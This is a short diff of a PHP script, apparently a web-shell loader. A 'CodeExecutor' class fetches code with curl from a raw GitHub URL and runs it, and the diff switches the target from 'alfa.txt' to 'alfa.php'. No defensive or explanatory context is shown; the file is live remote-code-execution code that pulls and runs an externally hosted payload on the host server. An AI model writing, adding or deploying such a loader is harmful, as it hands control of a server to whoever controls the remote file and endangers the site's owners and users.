@@ -61,5 +61,5 @@ class CodeExecutor {
 
 $fetcher = new CurlFetcher();
 $executor = new CodeExecutor($fetcher);
-$executor->executeCodeFromURL("https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/alfa.txt");
+$executor->executeCodeFromURL("https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/alfa.php");
 ?>
